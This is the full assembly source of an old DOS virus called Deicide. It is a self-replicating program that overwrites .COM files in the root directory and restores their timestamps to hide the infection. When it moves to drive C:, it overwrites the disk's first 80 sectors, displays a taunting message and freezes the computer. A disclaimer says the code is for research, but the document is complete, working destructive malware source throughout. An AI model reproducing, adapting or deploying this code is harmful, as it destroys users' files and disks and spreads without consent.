;*******************************************************
; Source code of the Deicide Virus - Made by XSTC
; Made in A86 v3.07
;
; The Deicide virus is a non-resident overwriting .COM
; virus, with a length of 666 bytes. It is uncoded, and
; infects a .COM file on the actual drive in the root
; directory. If all files are infected, it skips to the
; next drive. If it skips from A or B, drive C is
; destroyed, the message below is displayed and the
; virus locks the computer. If it could infect a
; program, the virus returns to dos displaying
; 'File corruption error.'
;
; This code is only made to show the possibilities and
; dangers of a virus. It is only intended for research
; purposes - spreading a virus is prohibited by law.
;*******************************************************

Start_Prog:     jmp short Start_Virus
                nop

Message         db 0Dh,0Ah,'DEICIDE!'
                db 0Dh,0Ah
                db 0Dh,0Ah,'Glenn (666) says : BYE BYE HARDDISK!!'
                db 0Dh,0Ah
                db 0Dh,0Ah,'Next time be carufull with illegal stuff......$'

Start_Virus:    mov ah,19h                                    ; Get actual drive
                int 21h

                db 0A2h                         ; Mov [EA],al
                dw offset Infect_Drive
                db 0A2h                            ; A86 compiles this different
                dw offset Actual_Drive         ; so I put here the original code

                mov ah,47h                                      ; Get actual dir
                mov dl,0
                mov si,offset Actual_Dir
                int 21h

                mov ah,1Ah                                   ; DTA to safe place
                mov dx,offset New_DTA
                int 21h

Infect_Next:    mov ah,3Bh                                      ; Go to root dir
                mov dx,offset Root_Dir
                int 21h

                mov ah,4Eh                              ; Search first .COM file
                mov cx,0
                mov dx,offset Search_Path
                int 21h

Check_Command:  mov al,'D'                 ; Check 7th char is a 'D' (To prevent
                cmp [New_DTA+24h],al                    ; infecting COMMAND.COM)
                jnz Check_Infect
                jmp short Search_Next
                nop

Check_Infect:   mov ah,3Dh                   ; Open found file with write access
                mov al,2
                mov dx,offset New_DTA+1Eh
                int 21h
                mov File_Handle,ax                                 ; Save handle
                mov bx,ax

                mov ah,57h                               ; Get date/time of file
                mov al,0
                int 21h
                mov File_Date,dx
                mov File_Time,cx

                call Go_Beg_File                           ; Go to begin of file

                mov ah,3Fh                                  ; Read first 2 bytes
                mov cx,2
                mov dx,offset Read_Buf
                int 21h

                mov al,byte ptr [Read_Buf+1]
                cmp al,offset Start_Virus-102h                      ; Same jump?
                jnz Infect                                          ; No, infect

                mov ah,3Eh                       ; Already infected - close file
                int 21h

Search_Next:    mov ah,4Fh                                    ; Search next file
                int 21h
                jnc Check_Command                     ; No error - try this file

                mov al,Infect_Drive                        ; Skip to next drive,
                cmp al,0                                   ; but A directly to C
                jnz No_A_Drive
                inc al
No_A_Drive:     inc al
                cmp al,3                                         ; Drive now C:?
                jnz No_Destroy

                mov al,2                      ; Overwrite first 80 sectors of C:
                mov bx,0
                mov cx,50h
                mov dx,0
                int 26h

                mov ah,9                           ; Show message of destruction
                mov dx,offset Message
                int 21h

Lock_System:    jmp short Lock_System                      ; And lock the system

No_Destroy:     mov dl,al                                     ; New actual drive
                mov ah,0Eh
                mov Infect_Drive,dl                             ; Save drive nr.
                int 21h

                jmp Infect_Next

Infect:         call Go_Beg_File

                mov ah,40h                    ; Overwrite first bytes with virus
                mov cx,offset End_Virus-100h
                mov dx,100h
                int 21h

                mov ah,57h                           ; Restore date/time of file
                mov al,1
                mov cx,File_Time
                mov dx,File_Date
                int 21h

                mov ah,3Eh                                               ; Close file
                int 21h

                mov dl,byte ptr [Actual_Drive]          ; Back to original drive
                mov ah,0Eh
                int 21h

                mov ah,3Bh                                    ; And original dir
                mov dx,offset Actual_Dir
                int 21h

                mov ah,9                         ; Show 'File corruption error.'
                mov dx,offset Quit_Message
                int 21h

                int 20h                                            ; Back to DOS

Go_Beg_File:    mov ah,42h                      ; Procedure: Go to begin of file
                mov al,0
                mov cx,0
                mov dx,0
                int 21h
                ret


File_Date       dw (?)
File_Time       dw (?)

File_Handle     dw (?)

Infect_Drive    db (?)

Root_Dir        db '\',0

Search_Path     db '*.COM',0

Read_Buf        db 2 dup (?)

Actual_Drive    db (?)

Quit_Message    db 'File corruption error.',0Dh,0Ah,'$'

New_DTA         db 2Bh dup (?)

Actual_Dir      db 40h dup (?)

                db 'This experimental virus was written by Glenn Benton to '
                db 'see if I can make a virus while learning machinecode for '
                db '2,5 months. (C) 10-23-1990 by Glenn. I keep on going '
                db 'making virusses.'

End_Virus:
